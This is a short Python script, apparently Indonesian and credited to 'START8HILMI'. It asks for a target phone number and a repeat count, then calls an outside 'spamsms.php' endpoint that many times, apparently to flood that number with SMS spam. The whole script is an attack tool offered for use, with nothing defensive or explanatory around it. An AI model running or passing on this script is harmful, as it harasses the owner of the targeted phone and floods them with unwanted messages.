import requests,os


os.system("clear")

print("∆ AUTHOR : START8HILMI ∆")
print("∆ YT : START8HILMI ∆")
nomor = input ("nomor target : ")
jumlah = int(input("jumlah : "))
for i in range(jumlah):
   url = requests.get(f"https://darkteam.my.id/minispam/spamsms.php?nomor={nomor}")
